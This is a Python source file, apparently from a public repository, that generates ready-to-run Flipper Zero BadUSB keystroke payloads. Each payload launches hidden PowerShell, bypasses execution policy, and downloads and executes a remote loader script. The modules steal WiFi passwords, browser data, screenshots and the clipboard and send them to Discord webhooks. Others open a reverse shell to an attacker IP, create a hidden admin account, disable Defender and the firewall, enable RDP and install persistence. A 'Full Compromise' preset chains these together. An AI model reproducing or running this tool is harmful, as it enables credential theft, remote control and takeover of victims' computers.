#!/usr/bin/env python3
"""
🚀 Modular Payload Generator for Flipper Zero
============================================================

Generate ready-to-use Flipper Zero payloads with your configuration
baked in. No more editing files manually!

Usage:
    python modular_generator.py                    # Interactive mode
    python modular_generator.py --module wifi --discord WEBHOOK_URL
    python modular_generator.py --module shell --ip 192.168.1.100 --port 4444
    python modular_generator.py --preset full_exfil --discord WEBHOOK_URL

Author: dil1thium
License: CC BY-NC-SA 4.0
"""

import os
import sys
import argparse
import json
from pathlib import Path
from datetime import datetime

# ANSI Colors
class C:
    R = '\033[91m'   # Red
    G = '\033[92m'   # Green
    Y = '\033[93m'   # Yellow
    B = '\033[94m'   # Blue
    M = '\033[95m'   # Magenta
    C = '\033[96m'   # Cyan
    W = '\033[97m'   # White
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

# Base URL for your GitHub repo (change this if you fork)
GITHUB_USERNAME = "reschjonas"
REPO_NAME = "FlipperZero_BadUSB"
BASE_URL = f"https://raw.githubusercontent.com/{GITHUB_USERNAME}/{REPO_NAME}/main/remote-payloads"
LOADER_URL = f"{BASE_URL}/loaders/loader.ps1"

# Module definitions
MODULES = {
    # Exfiltration
    'wifi': {
        'name': 'WiFi Password Grabber',
        'description': 'Extracts all saved WiFi passwords',
        'category': 'Exfiltration',
        'requires': ['discord'],
        'optional': ['dropbox'],
        'admin': False,
    },
    'screenshot': {
        'name': 'Screenshot Capture',
        'description': 'Takes screenshot and uploads to Discord',
        'category': 'Exfiltration',
        'requires': ['discord'],
        'optional': [],
        'admin': False,
    },
    'sysinfo': {
        'name': 'System Information',
        'description': 'Comprehensive system info dump',
        'category': 'Exfiltration',
        'requires': ['discord'],
        'optional': ['dropbox'],
        'admin': False,
    },
    'browser': {
        'name': 'Browser Data',
        'description': 'Chrome/Edge/Firefox browser info',
        'category': 'Exfiltration',
        'requires': ['discord'],
        'optional': [],
        'admin': False,
    },
    'ip': {
        'name': 'IP & Geolocation',
        'description': 'IP addresses with geolocation data',
        'category': 'Exfiltration',
        'requires': ['discord'],
        'optional': [],
        'admin': False,
    },
    'clipboard': {
        'name': 'Clipboard Grabber',
        'description': 'Current clipboard contents',
        'category': 'Exfiltration',
        'requires': ['discord'],
        'optional': [],
        'admin': False,
    },
    
    # Execution
    'shell': {
        'name': 'Reverse Shell',
        'description': 'PowerShell reverse shell',
        'category': 'Execution',
        'requires': ['ip', 'port'],
        'optional': ['discord'],
        'admin': False,
    },
    'admin': {
        'name': 'Create Admin User',
        'description': 'Creates hidden administrator account',
        'category': 'Execution',
        'requires': [],
        'optional': ['discord', 'username', 'password'],
        'admin': True,
    },
    'rdp': {
        'name': 'Enable RDP',
        'description': 'Enables Remote Desktop Protocol',
        'category': 'Execution',
        'requires': [],
        'optional': ['discord'],
        'admin': True,
    },
    'defender': {
        'name': 'Disable Defender',
        'description': 'Adds exclusions, disables protections',
        'category': 'Execution',
        'requires': [],
        'optional': ['discord'],
        'admin': True,
    },
    'firewall': {
        'name': 'Disable Firewall',
        'description': 'Disables Windows Firewall',
        'category': 'Execution',
        'requires': [],
        'optional': ['discord'],
        'admin': True,
    },
    
    # Fun
    'rickroll': {
        'name': 'Rick Roll',
        'description': 'Classic Rick Roll with max volume',
        'category': 'Fun',
        'requires': [],
        'optional': ['discord'],
        'admin': False,
    },
    'bsod': {
        'name': 'Fake BSOD',
        'description': 'Fake Blue Screen of Death',
        'category': 'Fun',
        'requires': [],
        'optional': ['discord'],
        'admin': False,
    },
    'wallpaper': {
        'name': 'Wallpaper Changer',
        'description': 'Changes desktop wallpaper',
        'category': 'Fun',
        'requires': [],
        'optional': ['discord', 'url'],
        'admin': False,
    },
    'tts': {
        'name': 'Text to Speech',
        'description': 'Make computer speak',
        'category': 'Fun',
        'requires': [],
        'optional': ['discord', 'message'],
        'admin': False,
    },
    
    # Recon
    'recon': {
        'name': 'Full Reconnaissance',
        'description': 'Complete system reconnaissance',
        'category': 'Recon',
        'requires': ['discord'],
        'optional': ['dropbox'],
        'admin': False,
    },
    
    # Persistence
    'persist': {
        'name': 'Install Persistence',
        'description': 'Multiple persistence methods',
        'category': 'Persistence',
        'requires': [],
        'optional': ['discord', 'url'],
        'admin': True,
    },
}

# Presets (combinations of modules)
PRESETS = {
    'full_exfil': {
        'name': 'Full Exfiltration',
        'description': 'Runs all exfil modules: sysinfo, ip, wifi, browser, screenshot',
        'modules': ['sysinfo', 'ip', 'wifi', 'browser', 'screenshot'],
        'requires': ['discord'],
    },
    'quick_recon': {
        'name': 'Quick Recon',
        'description': 'Fast system reconnaissance',
        'modules': ['sysinfo', 'ip'],
        'requires': ['discord'],
    },
    'pwn': {
        'name': 'Full Compromise',
        'description': 'Create admin + disable defender + enable RDP + persist',
        'modules': ['defender', 'admin', 'rdp', 'persist'],
        'requires': [],
        'optional': ['discord'],
    },
}


def generate_ducky_script(module: str, config: dict) -> str:
    """Generate DuckyScript payload for a module."""
    
    mod_info = MODULES.get(module)
    if not mod_info:
        raise ValueError(f"Unknown module: {module}")
    
    # Build environment variable string
    env_vars = []
    
    if config.get('discord'):
        env_vars.append(f"$env:DC='{config['discord']}'")
    if config.get('dropbox'):
        env_vars.append(f"$env:DB='{config['dropbox']}'")
    if config.get('ip'):
        env_vars.append(f"$env:IP='{config['ip']}'")
    if config.get('port'):
        env_vars.append(f"$env:PT='{config['port']}'")
    if config.get('url'):
        env_vars.append(f"$env:U='{config['url']}'")
    if config.get('message'):
        env_vars.append(f"$env:MSG='{config['message']}'")
    if config.get('username'):
        env_vars.append(f"$env:USR='{config['username']}'")
    if config.get('password'):
        env_vars.append(f"$env:PWD='{config['password']}'")
    
    env_vars.append(f"$env:M='{module}'")
    
    env_string = ';'.join(env_vars)
    
    # Build the script
    lines = [
        f"REM ============================================================",
        f"REM 🚀 {mod_info['name']} - Auto-Generated Modular Payload",
        f"REM ============================================================",
        f"REM Module: {module}",
        f"REM Category: {mod_info['category']}",
        f"REM Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"REM Description: {mod_info['description']}",
        f"REM ",
        f"REM This payload was auto-generated by modular_generator.py",
        f"REM ============================================================",
        f"ID 1234:5678 Manufacturer:Keyboard",
        f"DELAY 500",
        f"GUI r",
        f"DELAY 400",
    ]
    
    # Check if admin is required
    if mod_info['admin']:
        # Use Start-Process with runAs
        ps_cmd = f"powershell Start-Process powershell -Verb runAs -ArgumentList '-w h -ep bypass \"{env_string};irm {LOADER_URL}|iex\"'"
        lines.append(f"STRING {ps_cmd}")
        lines.append("ENTER")
        lines.append("DELAY 1500")
        lines.append("REM UAC Accept")
        lines.append("LEFTARROW")
        lines.append("DELAY 200")
        lines.append("ENTER")
    else:
        # Direct execution
        ps_cmd = f'powershell -w h -ep bypass "{env_string};irm {LOADER_URL}|iex"'
        lines.append(f"STRING {ps_cmd}")
        lines.append("ENTER")
    
    return '\n'.join(lines)


def generate_preset_script(preset: str, config: dict) -> str:
    """Generate DuckyScript payload for a preset (multiple modules)."""
    
    preset_info = PRESETS.get(preset)
    if not preset_info:
        raise ValueError(f"Unknown preset: {preset}")
    
    # Build environment variable string
    env_vars = []
    
    if config.get('discord'):
        env_vars.append(f"$env:DC='{config['discord']}'")
    if config.get('dropbox'):
        env_vars.append(f"$env:DB='{config['dropbox']}'")
    
    env_string = ';'.join(env_vars) if env_vars else ''
    
    # Build module list for loop
    modules_list = "','".join(preset_info['modules'])
    
    lines = [
        f"REM ============================================================",
        f"REM 🎯 {preset_info['name']} - Auto-Generated Preset",
        f"REM ============================================================",
        f"REM Preset: {preset}",
        f"REM Modules: {', '.join(preset_info['modules'])}",
        f"REM Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"REM Description: {preset_info['description']}",
        f"REM ",
        f"REM This payload was auto-generated by modular_generator.py",
        f"REM ============================================================",
        f"ID 1234:5678 Manufacturer:Keyboard",
        f"DELAY 500",
        f"GUI r",
        f"DELAY 400",
    ]
    
    # Check if any module requires admin
    needs_admin = any(MODULES[m]['admin'] for m in preset_info['modules'])
    
    # Build the loop command
    loop_cmd = f"$b='{LOADER_URL}';'{modules_list}'|%{{$env:M=$_;irm $b|iex;sleep 1}}"
    
    if env_string:
        full_cmd = f"{env_string};{loop_cmd}"
    else:
        full_cmd = loop_cmd
    
    if needs_admin:
        ps_cmd = f"powershell Start-Process powershell -Verb runAs -ArgumentList '-w h -ep bypass \"{full_cmd}\"'"
        lines.append(f"STRING {ps_cmd}")
        lines.append("ENTER")
        lines.append("DELAY 1500")
        lines.append("LEFTARROW")
        lines.append("DELAY 200")
        lines.append("ENTER")
    else:
        ps_cmd = f'powershell -w h -ep bypass "{full_cmd}"'
        lines.append(f"STRING {ps_cmd}")
        lines.append("ENTER")
    
    return '\n'.join(lines)


def interactive_mode():
    """Interactive payload generator."""
    
    print(f"\n{C.BOLD}{'='*60}{C.END}")
    print(f"{C.C}🚀 MODULAR PAYLOAD GENERATOR{C.END}")
    print(f"{C.DIM}Ultra-minimal, highly configurable payload generator{C.END}")
    print(f"{C.BOLD}{'='*60}{C.END}")
    
    while True:
        print(f"\n{C.Y}Options:{C.END}")
        print("  [1] Generate single module payload")
        print("  [2] Generate preset (multiple modules)")
        print("  [3] List all modules")
        print("  [4] List all presets")
        print("  [5] Quick: WiFi + Discord")
        print("  [6] Quick: Full Exfil + Discord")
        print("  [7] Quick: Reverse Shell")
        print("  [q] Quit")
        
        choice = input(f"\n{C.G}Select: {C.END}").strip().lower()
        
        if choice == 'q':
            print(f"\n{C.C}Goodbye! 🦆{C.END}\n")
            break
        
        elif choice == '1':
            # Single module
            print(f"\n{C.C}Available Modules:{C.END}")
            for cat in ['Exfiltration', 'Execution', 'Fun', 'Recon', 'Persistence']:
                mods = [k for k, v in MODULES.items() if v['category'] == cat]
                if mods:
                    print(f"\n  {C.M}{cat}:{C.END}")
                    for m in mods:
                        admin = "🔐" if MODULES[m]['admin'] else "  "
                        print(f"    {admin} {m:12} - {MODULES[m]['name']}")
            
            module = input(f"\n{C.G}Module name: {C.END}").strip().lower()
            if module not in MODULES:
                print(f"{C.R}Unknown module!{C.END}")
                continue
            
            config = get_config_for_module(module)
            script = generate_ducky_script(module, config)
            save_payload(script, f"{module}_payload.txt")
        
        elif choice == '2':
            # Preset
            print(f"\n{C.C}Available Presets:{C.END}")
            for name, info in PRESETS.items():
                print(f"  • {name:15} - {info['description']}")
            
            preset = input(f"\n{C.G}Preset name: {C.END}").strip().lower()
            if preset not in PRESETS:
                print(f"{C.R}Unknown preset!{C.END}")
                continue
            
            config = {}
            if 'discord' in PRESETS[preset].get('requires', []):
                config['discord'] = input(f"{C.G}Discord webhook URL: {C.END}").strip()
            elif input(f"{C.Y}Add Discord webhook? (y/n): {C.END}").lower() == 'y':
                config['discord'] = input(f"{C.G}Discord webhook URL: {C.END}").strip()
            
            script = generate_preset_script(preset, config)
            save_payload(script, f"{preset}_payload.txt")
        
        elif choice == '3':
            # List modules
            print(f"\n{C.BOLD}{'='*60}{C.END}")
            print(f"{C.C}📦 ALL MODULES{C.END}")
            print(f"{C.BOLD}{'='*60}{C.END}")
            
            for cat in ['Exfiltration', 'Execution', 'Fun', 'Recon', 'Persistence']:
                mods = [(k, v) for k, v in MODULES.items() if v['category'] == cat]
                if mods:
                    print(f"\n{C.M}📁 {cat}{C.END}")
                    for name, info in mods:
                        admin = "🔐 Admin" if info['admin'] else "   User "
                        req = ', '.join(info['requires']) if info['requires'] else 'none'
                        print(f"  {admin} {C.W}{name:12}{C.END} {info['name']}")
                        print(f"          {C.DIM}Requires: {req}{C.END}")
        
        elif choice == '4':
            # List presets
            print(f"\n{C.BOLD}{'='*60}{C.END}")
            print(f"{C.C}🎯 ALL PRESETS{C.END}")
            print(f"{C.BOLD}{'='*60}{C.END}")
            
            for name, info in PRESETS.items():
                print(f"\n{C.W}{name}{C.END} - {info['name']}")
                print(f"  {C.DIM}{info['description']}{C.END}")
                print(f"  Modules: {', '.join(info['modules'])}")
        
        elif choice == '5':
            # Quick: WiFi
            config = {'discord': input(f"{C.G}Discord webhook URL: {C.END}").strip()}
            script = generate_ducky_script('wifi', config)
            save_payload(script, "wifi_grabber_ready.txt")
        
        elif choice == '6':
            # Quick: Full Exfil
            config = {'discord': input(f"{C.G}Discord webhook URL: {C.END}").strip()}
            script = generate_preset_script('full_exfil', config)
            save_payload(script, "full_exfil_ready.txt")
        
        elif choice == '7':
            # Quick: Reverse Shell
            print(f"\n{C.Y}Setup your listener first:{C.END}")
            print(f"  {C.DIM}nc -lvnp 4444{C.END}")
            config = {
                'ip': input(f"\n{C.G}Your IP address: {C.END}").strip(),
                'port': input(f"{C.G}Port (default 4444): {C.END}").strip() or '4444',
            }
            if input(f"{C.Y}Add Discord notification? (y/n): {C.END}").lower() == 'y':
                config['discord'] = input(f"{C.G}Discord webhook URL: {C.END}").strip()
            
            script = generate_ducky_script('shell', config)
            save_payload(script, "reverse_shell_ready.txt")


def get_config_for_module(module: str) -> dict:
    """Get configuration for a module interactively."""
    mod = MODULES[module]
    config = {}
    
    # Required fields
    for field in mod['requires']:
        if field == 'discord':
            config['discord'] = input(f"{C.G}Discord webhook URL: {C.END}").strip()
        elif field == 'dropbox':
            config['dropbox'] = input(f"{C.G}Dropbox token: {C.END}").strip()
        elif field == 'ip':
            config['ip'] = input(f"{C.G}Attacker IP: {C.END}").strip()
        elif field == 'port':
            config['port'] = input(f"{C.G}Port (default 4444): {C.END}").strip() or '4444'
    
    # Optional fields
    for field in mod['optional']:
        if field == 'discord' and 'discord' not in config:
            if input(f"{C.Y}Add Discord webhook? (y/n): {C.END}").lower() == 'y':
                config['discord'] = input(f"{C.G}Discord webhook URL: {C.END}").strip()
        elif field == 'dropbox' and 'dropbox' not in config:
            if input(f"{C.Y}Add Dropbox token? (y/n): {C.END}").lower() == 'y':
                config['dropbox'] = input(f"{C.G}Dropbox token: {C.END}").strip()
        elif field == 'url':
            if input(f"{C.Y}Custom URL? (y/n): {C.END}").lower() == 'y':
                config['url'] = input(f"{C.G}URL: {C.END}").strip()
        elif field == 'message':
            if input(f"{C.Y}Custom message? (y/n): {C.END}").lower() == 'y':
                config['message'] = input(f"{C.G}Message: {C.END}").strip()
        elif field == 'username':
            config['username'] = input(f"{C.G}Username (default: sysadmin): {C.END}").strip() or None
        elif field == 'password':
            config['password'] = input(f"{C.G}Password (default: P@ssw0rd123!): {C.END}").strip() or None
    
    return config


def save_payload(script: str, default_name: str):
    """Save payload to file."""
    
    # Default output directory
    output_dir = Path.home() / 'Desktop' / 'FlipperZero_Payloads'
    output_dir.mkdir(parents=True, exist_ok=True)
    
    filename = input(f"{C.G}Filename (default: {default_name}): {C.END}").strip() or default_name
    output_path = output_dir / filename
    
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(script)
    
    print(f"\n{C.G}{'='*60}{C.END}")
    print(f"{C.G}✅ PAYLOAD GENERATED!{C.END}")
    print(f"{C.G}{'='*60}{C.END}")
    print(f"\n{C.W}📁 Saved to: {C.BOLD}{output_path}{C.END}")
    print(f"\n{C.C}📋 Next Steps:{C.END}")
    print(f"   1. Copy to Flipper Zero: SD Card → badusb/")
    print(f"   2. On Flipper: Bad USB → Select → Run")
    
    # Show preview
    print(f"\n{C.DIM}Preview:{C.END}")
    for line in script.split('\n')[:15]:
        print(f"   {C.DIM}{line}{C.END}")
    if script.count('\n') > 15:
        print(f"   {C.DIM}...{C.END}")


def main():
    parser = argparse.ArgumentParser(
        description="🚀 Modular Payload Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python modular_generator.py                                    # Interactive
  python modular_generator.py --module wifi --discord URL        # WiFi grabber
  python modular_generator.py --module shell --ip 1.2.3.4        # Reverse shell
  python modular_generator.py --preset full_exfil --discord URL  # Full exfil
        """
    )
    
    parser.add_argument('--module', '-m', help='Module to generate')
    parser.add_argument('--preset', '-p', help='Preset to generate')
    parser.add_argument('--discord', '-d', help='Discord webhook URL')
    parser.add_argument('--dropbox', '-db', help='Dropbox token')
    parser.add_argument('--ip', help='Attacker IP (for shell)')
    parser.add_argument('--port', default='4444', help='Port (for shell)')
    parser.add_argument('--output', '-o', help='Output file path')
    parser.add_argument('--list', '-l', action='store_true', help='List modules and presets')
    
    args = parser.parse_args()
    
    if args.list:
        print(f"\n{C.C}Modules:{C.END}")
        for name, info in MODULES.items():
            print(f"  {name:12} - {info['name']}")
        print(f"\n{C.C}Presets:{C.END}")
        for name, info in PRESETS.items():
            print(f"  {name:12} - {info['name']}")
        return
    
    if args.module:
        config = {
            'discord': args.discord,
            'dropbox': args.dropbox,
            'ip': args.ip,
            'port': args.port,
        }
        config = {k: v for k, v in config.items() if v}
        
        script = generate_ducky_script(args.module, config)
        
        if args.output:
            with open(args.output, 'w') as f:
                f.write(script)
            print(f"Saved to {args.output}")
        else:
            print(script)
    
    elif args.preset:
        config = {
            'discord': args.discord,
            'dropbox': args.dropbox,
        }
        config = {k: v for k, v in config.items() if v}
        
        script = generate_preset_script(args.preset, config)
        
        if args.output:
            with open(args.output, 'w') as f:
                f.write(script)
            print(f"Saved to {args.output}")
        else:
            print(script)
    
    else:
        interactive_mode()


if __name__ == '__main__':
    main()

